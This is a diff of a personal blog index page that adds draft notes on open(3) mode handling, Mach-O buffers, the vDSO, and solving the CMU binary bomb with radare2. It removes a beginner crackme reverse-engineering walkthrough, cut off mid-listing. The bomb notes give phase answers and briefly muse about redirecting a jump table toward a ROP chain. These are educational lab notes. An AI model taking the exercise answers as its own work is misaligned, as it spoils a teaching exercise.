@@ -9,9 +9,8 @@
   <meta name="author" content="Mark Mossberg">
 
   
-  <meta name="description" content="This is a pretty late post, but I wanted to show off the hardware I designed
-as a follow up to the first
-&ldquo;Building a Simple IoT Light Switch& &hellip;">
+  <meta name="description" content="for a variadic function, there is no way to tell how many arguments you
+were actually passed. need some out of band method. open(3) -> flag &amp; &hellip;&#8221;>
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -20,7 +19,7 @@ as a follow up to the first
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://blog.mark.lc/">
+  <link rel="canonical" href="http://mark.systems/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <link href="/atom.xml" rel="alternate" title="Mark Mossberg's Blog" type="application/atom+xml">
@@ -64,7 +63,7 @@ as a follow up to the first
   
 <form action="https://www.google.com/search" method="get">
   <fieldset role="search">
-    <input type="hidden" name="sitesearch" value="blog.mark.lc">
+    <input type="hidden" name="sitesearch" value="mark.systems">
     <input class="search" type="text" name="q" results="0" placeholder="Search"/>
   </fieldset>
 </form>
@@ -81,6 +80,300 @@ as a follow up to the first
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/18/asking-what-if-with-open/">Asking What if With Open</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-18T00:10:29-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:10 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>for a variadic function, there is no way to tell how many arguments you
+were actually passed. need some out of band method.
+    open(3) -> flag &amp; O_CREAT
+    printf(3) -> format string characters</p>
+
+<p>open has a 2 arg and a 3 arg form
+3 arg form is if you use o_creat, you need to specify th emode
+but i wondered, who is enforcing that?
+the compiler doesn&rsquo;t care, to it, it&rsquo;s just another variadic function
+what&rsquo;s to prevent a programmer from mistakenly doing open(&ldquo;path&rdquo;, O_CREATE) and forgetting the third arg
+let&rsquo;s dig
+first, it&rsquo;ll pass into libc.
+libc doesn&rsquo;t do any checks. it simply detects whether to get a third arg
+via thing &amp; O_CREAT and calls va_arg to get the third arg. va_arg is a dumb
+macro that basically just dereferences memory in the right spot on the stack
+if it wasn&rsquo;t given, oh well, va_args is going to return random memory
+so if libc doesn&rsquo;t check , who&rsquo;s next? well, it&rsquo;s the kernel!
+look at fs/open.c to walk through the function calls to find where mode
+is validated. mode is actually not used much. there&rsquo;s an interesting line
+where it&rsquo;s anded with something and then or&rsquo;d with something. i presume that
+and is chopping off the high bits since the valid values of mode
+are up to 00700, there&rsquo;s no reason to keep higher than the 4th octal digit
+that&rsquo;s a form of validation. but it will still cause incorrect results because you&rsquo;ve
+essentially used a random number as your mode&hellip;
+and indeed that&rsquo;s what happened! the kernel</p>
+
+<p>interesting implications. no error anyway, the only way you&rsquo;d see it is if
+you looked at the permissions of the created file. security implications?
+could there be projects out there that possibly create files that got
+randomly set to too openly viewable? WRITEABLE?</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/14/learning-trivia-about-mach0/">Buffers and Binary Formats</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-14T11:55:42-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:55 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>main point: everything isn&rsquo;t linux. in my experience most people know
+linux the best because it&rsquo;s a good learning tool, it&rsquo;s what&rsquo;s used in school
+etc, however it&rsquo;s important not to assume every os works that way. there
+are other os&rsquo;s out there that do things differently!</p>
+
+<p>local buffers
+on linux the buffer is literally encoded into the instructino
+however on os x, in mach0, buffer actually still takes up space in a data
+section and is copied onto the stack versus an immediate move.</p>
+
+<p>notice how on linux your local buffer won&rsquo;t take space in the rodata
+if you look at the rodata, it&rsquo;s not there</p>
+
+<p>if you run strings on mach0 you see the string there</p>
+
+<p>this might be a lot faster on linux then?</p>
+
+<p>overview</p>
+
+<p>local buffers, defined for beginner c programmers. diff bt local buf + global buf (runtime va binary)
+linux local buffers
+    test program, disassemble, observe how string isn&rsquo;t in data sections, it&rsquo;s in the text
+mach0
+    it&rsquo;s actually different. observe how string isn&rsquo;t in text, it&rsquo;s still in
+    data. observe how the text moves it onto the stack</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/13/solving-cmu-binary-bomb-with-r2/">Solving Cmu Binary Bomb With R2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-13T11:03:51-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:03 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>aa</p>
+
+<p>why isn&rsquo;t sym.read_six_numebrs showing up?</p>
+
+<p>oh you need aaa?</p>
+
+<p>tons of options
+here are the common ones</p>
+
+<p>aaa
+afl and grep
+is
+i
+pdf needs @
+sf doesn&rsquo;t need @
+afna (where am i)
+afi
+afo</p>
+
+<p>find r2 works well with tmux</p>
+
+<p>whoa visual mode is magical
+but honestly&hellip;this is one of the things a gui is meant for</p>
+
+<p>wait now disas visual mode with : for r2 commands is where it&rsquo;s at</p>
+
+<p>debugging
+start with -d</p>
+
+<p>oo = restart/reload program
+dc = continue
+ds = step
+dr = regs</p>
+
+<p>phase 1: simple strcmp
+Public speaking is very easy.</p>
+
+<p>phase2</p>
+
+<p>phase_2(<em>,
+    int arr[6]
+    read_six(</em>, arr)
+    if arr[0] != 1; bomb</p>
+
+<pre><code>ebx = 1 // counter
+esi = arr
+
+eax = ebx + 1
+
+looping through array
+loops from 1 to 5. at the last iter, ebx will be 6
+eax is also ebx + 1
+the multiplcation is (loop iteration + 1) * 
+
+for i in range(1,6)
+    if arr[i] != arr[i-1] * i + 1
+        bomb
+ebx   1 2 3 4 5
+eax   2 3 4 5 6
+
+arr 1 2 6 24 120 720 &lt;&lt; winner!
+
+
+1 2 6
+
+eax = 2
+eax *= arr[0]
+if each != arr[1]; bomb
+ebx++
+if ebx 
+
+
+
+local_6 is the array
+
+local_10 
+</code></pre>
+
+<p>read_six_numbers(<em>, int[6])
+    sscanf(</em>, &ldquo;%d %d %d&hellip;.&rdquo;, int[0], int[1], &hellip;)
+    if ret > 5; return else bomb</p>
+
+<p>phase 3</p>
+
+<p>local3 is first number
+local 11 is second character
+local 1 is 2nd number</p>
+
+<p>local3 must be &lt;= 7</p>
+
+<p>does some fucking ridiculous relatively jump, redeferencing a random pointer
+into the .rodata plus a controlled value</p>
+
+<p>8be0
+8c00
+8c16
+8c28
+8c40
+8c52
+8c64
+8c78</p>
+
+<p>could you hack the binary bomb?
+it&rsquo;s giving you some amount of direct control over ip
+you need to find somewhere in memory that has a pointer to somewhere you
+can start a rop chain or something</p>
+
+<p>nope. you can only do &lt;=7, which is odd because there&rsquo;s 8 jump pointers</p>
+
+<p>so if i try to go for the first one</p>
+
+<p>0 q 777</p>
+
+<p>i feel like there&rsquo;s some other stuff in those options though</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/12/playing-with-vdso/">Playing With Vdso</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-12T12:29:58-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:29 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>carve vdso out of a process
+you can look at it with all the regular binutils! cool!
+look at all its symbols.
+disas time, look at how it works
+time is a very simple function
+    check arg is null</p>
+
+<p>in gdb if you break on time you get 2 breakpoints. this makes sense! there&rsquo;s
+one in libc and one in vdso!</p>
+
+<p>but wait, if you disas vdso.elf there&rsquo;s no &lsquo;time:&rsquo; function, just &lsquo;__vdso_time&rsquo;
+readelf/nm says time is a weak symbol but the other ones that are actually
+available with disas show up as global/text</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1295,937 +1588,6 @@ the script, and the script has exited.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/10/27/crackme/">Beginner Crackme</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-10-27'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>As part of an Intro to Security course I&rsquo;m taking, my professor gave us
-a crackme style exercise to practice reading x86 assembly and basic
-reverse engineering.</p>
-
-<p>The program is pretty simple. It accepts a password as an argument and we&rsquo;re
-told that if the password is correct, &ldquo;ok&rdquo; is printed.</p>
-
-<pre><code>$ ./crackme
-usage: ./crackme &lt;secret&gt;
-$ ./crackme test
-$
-</code></pre>
-
-<p>As usual, I start by running <code>file</code> on the binary, which shows that it&rsquo;s a
-standard x64 ELF binary. <code>file</code> also says that the binary is &ldquo;not stripped&rdquo;, which means
-that it includes symbols. All I really know about symbols are that they can
-include debugging information about a binary like function and variable names
-and some symbols aren&rsquo;t really necessary; they can be stripped out to reduce
-the binary&rsquo;s size and make reverse engineering more challenging. Maybe I&rsquo;ll
-do a more in depth post on this in the future.</p>
-
-<pre><code>$ file crackme
-crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x3fcf895b7865cb6be6b934640d1519a1e6bd6d39, not stripped
-</code></pre>
-
-<p>Next, I run <code>strings</code>, hoping to get lucky and find the password amongst the
-strings in the binary. Strings looks for series of printable characters followed
-by a NULL, but unfortunately nothing here works as the password.</p>
-
-<pre><code>$ strings crackme
-/lib64/ld-linux-x86-64.so.2
-exd4
-libc.so.6
-puts
-printf
-memcmp
-__libc_start_main
-__gmon_start__
-GLIBC_2.2.5
-fffff.
-AWAVA
-AUATL
-[]A\A]A^A_
-usage: %s &lt;secret&gt;
-;*3$"
-</code></pre>
-
-<p>Since that didn&rsquo;t work, we&rsquo;re forced to disassemble the binary and
-actually try to reverse engineer it.
-We&rsquo;ll start with <code>main</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">$</span> <span class="no">gdb</span> <span class="p">-</span><span class="no">batch</span> <span class="p">-</span><span class="no">ex</span> <span class="err">&#39;</span><span class="no">file</span> <span class="no">crackme</span><span class="err">&#39;</span> <span class="p">-</span><span class="no">ex</span> <span class="err">&#39;</span><span class="no">disas</span> <span class="no">main</span><span class="err">&#39;</span>
-</span><span class='line'><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004a0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004a4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">cmp</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004a7</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">jle</span>    <span class="mh">0x4004c7</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">39</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004a9</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rsi</span><span class="err">+</span><span class="mi">0x8</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004ad</span> <span class="err">&lt;+</span><span class="mi">13</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4005e0</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b2</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">test</span>   <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b4</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x4004c2</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">34</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b6</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x4006e8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004bb</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400450</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c0</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c2</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c6</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c7</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rsi</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004ca</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x4006d4</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004cf</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004d1</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400460</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004d6</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004db</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4004c2</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">34</span><span class="p">&gt;</span>
-</span><span class='line'><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Let&rsquo;s break this down a little.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">0</span><span class="nf">x00000000004004a0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
-</span><span class='line'><span class="err">0</span><span class="nf">x00000000004004a4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">cmp</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'><span class="err">0</span><span class="nf">x00000000004004a7</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">jle</span>    <span class="mh">0x4004c7</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">39</span><span class="p">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Starting at the beginning, we see the stack pointer decremented as part of
-the function prologue. The prologue is a set of setup steps involving
-saving the old frame&rsquo;s
-base pointer on the stack, reassigning the base pointer to the current
-stack pointer, then subtracting the stack pointer a certain amount to make room
-on the stack
-for local variables, etc. We don&rsquo;t see the former two steps because this is
-the main function so it doesn&rsquo;t <em>really</em> have a function calling it, so saving/setting
-the base pointer isn&rsquo;t necessary.</p>
-
-<p>Then the <code>edi</code> register is
-compared to 1 and if it is less than or equal, we jump to offset 39.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c2</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c6</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c7</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rsi</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004ca</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x4006d4</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004cf</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004d1</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400460</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004d6</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004db</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4004c2</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">34</span><span class="p">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here at offset 39, we print something then jump to offset 34 where we repair
-the stack (undo the sub instruction from the prologue) and return (ending
-execution).</p>
-
-<p>This is likely how the program checks the arguments and prints the usage
-message if no arguments are supplied (which would cause argc/edi to be 1).</p>
-
-<p>However if we supply an argument, <code>edi</code> is 0x2 and we move past the <code>jle</code>
-instruction.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004a9</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rsi</span><span class="err">+</span><span class="mi">0x8</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004ad</span> <span class="err">&lt;+</span><span class="mi">13</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4005e0</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here we can see the <code>verify_secret</code> function being called with a parameter
-in <code>rdi</code>. This is most likely the argument we passed into the program. We can
-confirm this with gdb (I&rsquo;m using it with <a href="http://ropshell.com/peda/">peda</a> here).</p>
-
-<pre><code>gdb-peda$ tele $rsi
-0000| 0x7fffffffeb48 --&gt; 0x7fffffffed6e ("/home/vagrant/crackme/crackme")
-0008| 0x7fffffffeb50 --&gt; 0x7fffffffed8c --&gt; 0x4548530074736574 ('test')
-0016| 0x7fffffffeb58 --&gt; 0x0
-</code></pre>
-
-<p>Indeed <code>rsi</code> points to the first element of <code>argv</code>, so incrementing that by 8 bytes
-(because 64 bit) points to <code>argv[1]</code>, which is our input.</p>
-
-<p>If we look after the <code>verify_secret</code> call we can see the program checks
-if <code>eax</code> is 0 and if it is, jumps to offset 34, ending the program. However, if
-<code>eax</code> is not zero, we&rsquo;ll hit a <code>puts</code> call before exiting, which will presumably
-print out the &ldquo;ok&rdquo; message we want.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b2</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">test</span>   <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b4</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x4004c2</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">34</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004b6</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x4006e8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004bb</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400450</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c0</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c2</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004004c6</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now lets disassemble <code>verify_secret</code> to see how the input validation is performed,
-and to see how we can make it return non-zero.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">verify_secret</span><span class="p">:</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005e0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x408</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005e7</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">movzx</span>  <span class="no">eax</span><span class="p">,</span><span class="no">BYTE</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rdi</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005ea</span> <span class="err">&lt;+</span><span class="mi">10</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">rsp</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005ed</span> <span class="err">&lt;+</span><span class="mi">13</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">test</span>   <span class="no">al</span><span class="p">,</span><span class="no">al</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005ef</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x400622</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">+</span><span class="mi">66</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005f1</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">rsp</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005f4</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x400604</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">+</span><span class="mi">36</span><span class="p">&gt;</span>
